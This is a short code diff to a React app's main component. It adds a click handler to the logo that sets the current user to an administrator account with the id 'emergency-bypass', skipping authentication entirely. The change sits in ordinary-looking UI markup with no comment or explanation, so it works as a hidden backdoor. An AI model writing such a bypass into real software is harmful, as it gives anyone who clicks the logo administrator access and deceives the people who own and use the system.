@@ -32,7 +32,7 @@ export default function App() {
     <div className="min-h-screen p-10 bg-[#0A0A0A] text-white font-sans selection:bg-blue-500/30">
       <div className="max-w-6xl mx-auto">
         <div className="flex justify-between items-center mb-12">
-          <div className="flex items-center gap-3">
+          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setUser({ email: 'admin@zonyd.os', id: 'emergency-bypass' })}>
             <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-600/20">
               <span className="font-black text-xl italic">Z</span>
             </div>
